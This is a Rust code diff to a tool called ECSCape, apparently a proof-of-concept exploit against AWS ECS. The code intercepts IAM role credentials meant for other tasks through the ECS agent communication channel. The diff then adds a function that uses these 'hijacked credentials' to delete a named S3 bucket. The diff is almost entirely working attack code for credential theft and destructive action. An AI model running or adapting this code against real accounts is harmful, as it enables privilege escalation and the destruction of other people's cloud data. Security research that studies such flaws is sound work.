@@ -1,6 +1,9 @@
 use anyhow::{Result, anyhow};
 use aws_sdk_ecs::Client as ECSClient;
 use aws_sdk_ecs::config::{Credentials, SharedCredentialsProvider};
+use aws_sdk_s3::Client as S3Client;
+use aws_sdk_s3::config::Region as S3Region;
+use aws_sdk_s3::config::{Builder as S3ConfigBuilder, Credentials as S3Credentials};
 use aws_types::SdkConfig;
 use aws_types::region::Region;
 use futures_util::{SinkExt, StreamExt};
@@ -13,7 +16,7 @@ use crate::config::{
 use crate::ecs_agent_metadata::ECSAgentMetadata;
 use crate::ecs_protocol_client::ECSProtocolClient;
 use crate::imds_metadata::IMDSMetadata;
-use crate::structs::{IAMRoleCredentialsAckRequest, ProtocolMessage};
+use crate::structs::{IAMRoleCredentials, IAMRoleCredentialsAckRequest, ProtocolMessage};
 use crate::utils::{build_ws_url, create_sigv4_signed_request};
 
 pub struct ECSCape {
@@ -35,7 +38,9 @@ impl ECSCape {
         })
     }
 
-    pub async fn start(&self) -> Result<()> {
+    pub async fn start(&self, s3_bucket: String) -> Result<()> {
+        info!("trying to delete s3 bucket: {s3_bucket}");
+
         let acs_url = self.get_acs_url().await?;
         debug!("acs url: {:#?}", acs_url);
 
@@ -57,8 +62,8 @@ impl ECSCape {
 
                     let ack_request = IAMRoleCredentialsAckRequest {
                         message_id: role_creds.message_id.clone(),
-                        expiration: role_creds.role_credentials.expiration,
-                        credentials_id: role_creds.role_credentials.credentials_id,
+                        expiration: role_creds.role_credentials.expiration.clone(),
+                        credentials_id: role_creds.role_credentials.credentials_id.clone(),
                     };
 
                     send_sink
@@ -66,12 +71,51 @@ impl ECSCape {
                         .await
                         .send(ProtocolMessage::IAMRoleCredentialsAckRequest(ack_request))
                         .await?;
+
+                    match self
+                        .delete_s3_bucket(&s3_bucket, role_creds.role_credentials)
+                        .await
+                    {
+                        Ok(_) => {
+                            info!("successfully deleted s3 bucket: {s3_bucket}");
+                            break;
+                        }
+                        Err(err) => {
+                            info!("failed to delete s3 bucket: {:#?}", err);
+                        }
+                    }
                 }
                 msg => {
-                    info!("ACS received message: {:#?}", msg);
+                    debug!("ACS received message: {:#?}", msg);
                 }
             }
         }
+
+        Ok(())
+    }
+
+    async fn delete_s3_bucket(&self, bucket: &str, creds: IAMRoleCredentials) -> Result<()> {
+        info!(
+            "Attempting to delete S3 bucket {} using hijacked credentials: {:#?}",
+            bucket, creds
+        );
+
+        let hijacked_creds = S3Credentials::new(
+            &creds.access_key_id,
+            &creds.secret_access_key,
+            Some(creds.session_token),
+            None,
+            "IMDS",
+        );
+
+        let config = S3ConfigBuilder::new()
+            .region(S3Region::new(self.imds_metadata.aws_region.clone()))
+            .credentials_provider(hijacked_creds)
+            .build();
+
+        let s3 = S3Client::from_conf(config);
+
+        s3.delete_bucket().bucket(bucket).send().await?;
 
         Ok(())
     }
